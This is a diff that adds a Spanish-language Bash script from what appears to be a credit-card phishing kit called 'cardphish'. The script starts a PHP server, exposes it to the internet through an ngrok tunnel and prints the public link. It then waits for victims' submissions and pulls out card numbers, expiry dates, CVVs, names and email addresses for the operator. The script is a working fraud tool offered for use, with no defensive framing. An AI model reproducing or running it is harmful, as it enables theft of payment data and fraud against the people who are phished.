@@ -1,0 +1,81 @@
+
+green="\e[0;32m\033[1m"
+white="\e[0m"
+red="\e[0;31m\033[1m"
+blue="\e[0;34m\033[1m"
+yellow="\e[0;33m\033[1m"
+purple="\e[0;35m\033[1m"
+turquoise="\e[0;36m\033[1m"
+gray="\e[1;90m"
+
+trap ctrl_c 2
+
+function ctrl_c {
+	rm -rf leeme.txt0
+	echo -e "${red}Saliendo...${white}"
+	exit 1
+}
+
+function banner {
+	pkill php 
+	pkill ngrok
+	ls > /dev/null 2>&1
+	clear
+	cd files
+	cat banner | lolcat 
+	cat banner2 | lolcat -a
+}
+
+function comenzar {
+
+	cd $HOME/cardphish
+	link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+	echo -e "${yellow} SELECCIONE EL LENGUAGE DEL SCRITP${white}\n"
+	echo -e "${yellow}    [${red}01${yellow}]${white}Español      ${yellow}[${red}02${yellow}]${white}Inglés\n"
+	read -p $' >> ' hol
+	echo 
+	sleep 2
+	echo -e "${yellow}[${red}*${yellow}]${green} Abriendo servidores..."
+	sleep 2
+	echo -e "${yellow}[${red}*${yellow}]${green} Abriendo servidor php...${white}"
+	php -S 127.0.0.1:3333 > /dev/null 2>&1 &
+	sleep 2
+	echo -e "${yellow}[${red}*${yellow}]${green} Abriendo servidor ngrok..."
+	./ngrok http 127.0.0.1:3333 > /dev/null 2>&1 &
+	sleep 10
+	echo -e "${yellow}[${red}*${yellow}]${green} Obteniendo URLs..."
+	echo -e "${yellow}[${red}*${yellow}]${green} Link local: ${white}localhost:4433"
+	sleep 2
+	echo -ne "${yellow}[${red}*${yellow}]${green} Link fuera de LAN:${white}"
+	curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io"
+	sleep 1
+	echo -e "\e[1;90mEsperando datos...\e[0m"
+	while [ true ]; do
+		if [ -e "leeme.txt" ]; then
+			echo ""
+			Ntarget=$(cat leeme.txt | grep -o "visa:.*" | cut -d ":" -f2)
+			mmaa=$(cat leeme.txt | grep -o "mmaa:.*" | cut -d ":" -f2)
+			cvv=$(cat leeme.txt | grep -o "cvv:.*" | cut -d ":" -f2)
+			nombre=$(cat leeme.txt | grep -o "nombre:.*" | cut -d ":" -f2)
+			apellido=$(cat leeme.txt | grep -o "apellido:.*" | cut -d ":" -f2)
+			correo=$(cat leeme.txt | grep -o "correo;.*" | cut -d ":" -f2)
+			cat linea | lolcat -a
+			echo ""
+			sleep 1
+			echo -e "${red}[${yellow}*${red}]${yellow} N°.de tarjeta: ${white}$Ntarget"
+			echo -e "${red}[${yellow}*${red}]${yellow} MM/AA.de targeta: ${white}$mmaa"
+			echo -e "${red}[${yellow}*${red}]${yellow} CVV de tarjeta: ${white}$cvv"
+			sleep 0.4
+			echo -e "${red}[${yellow}*${red}]${yellow} Nombre: ${white}$nombre"
+			echo -e "${red}[${yellow}*${red}]${yellow} Apellido: ${white}$apellido"
+			sleep 0.4
+			echo -e "${red}[${yellow}*${red}]${yellow} correo electronico: ${white}$correo"
+			echo ""
+			cat linea | lolcat -a
+			rm -rf leeme.txt
+		fi
+	done
+}
+
+banner
+comenzar
